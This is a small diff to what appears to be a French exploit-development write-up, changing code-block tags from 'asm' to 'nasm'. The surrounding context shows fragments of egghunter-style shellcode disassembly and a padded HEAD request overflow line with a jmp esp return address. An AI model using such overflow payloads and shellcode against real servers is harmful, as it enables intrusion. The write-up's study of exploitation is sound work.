@@ -1109,7 +1109,7 @@ with open(sys.argv[1]) as fd:
 
 Les shellcodes se ressemblent malheureusement tous, seul le tag change :  
 
-```asm
+```nasm
    0:   66 81 ca ff 0f          or     dx,0xfff
    5:   42                      inc    edx
    6:   52                      push   edx
@@ -1145,7 +1145,7 @@ HEAD /coffeeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA31
 
 Ici le shellcode est placé après l'adresse de retour (0x62501331 qui correspond à un *jmp esp*) :  
 
-```asm
+```nasm
    0:   66 81 ca ff 0f          or     dx,0xfff
    5:   42                      inc    edx
    6:   52                      push   edx
